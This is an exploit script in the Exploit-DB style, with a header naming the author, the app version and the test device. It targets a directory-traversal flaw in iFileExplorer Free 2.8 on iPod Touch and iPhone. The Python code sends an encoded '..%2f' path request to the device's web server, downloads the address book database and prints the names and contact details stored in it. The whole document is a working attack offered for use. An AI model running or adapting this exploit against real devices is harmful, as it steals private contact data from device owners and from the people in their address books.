# Exploit Title: iPod Touch/iPhone iFileExplorer Free Directory Traversal
# Date: 04/03/2011 #UK date format
# Author: theSmallNothing
# Software Link: http://itunes.apple.com/gb/app/ifileexplorer-protect-multi/id355253462?mt=8
# Version: 2.8
# Tested on: iPod Touch 2G (4.1)

import urllib, sqlite3

base = "http://192.168.0.3/" #Change to iDevice ip
url = base + "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/mobile/Library/AddressBook/AddressBook.sqlitedb" #Jailbroken Address

try:
    urllib.urlretrieve(url,"addressbook.sqlite")
    print "Grabbed Address Book\n"
except:
    print "Could not grab address book..."

conn = sqlite3.connect("addressbook.sqlite")
cursor = conn.cursor()
cmd = "SELECT * FROM ABPerson"
cursor.execute(cmd)
results = cursor.fetchall()
for person in results:
    if person[1] == None:
        continue
    print person[1], person[2]
    
    cmd = "SELECT * FROM ABMultiValue WHERE record_id="+str(person[0])
    cursor.execute(cmd)
    vunDataArr = cursor.fetchall()
    for vunData in vunDataArr:
        if vunData[5] != None:
            print "\t"+vunData[5]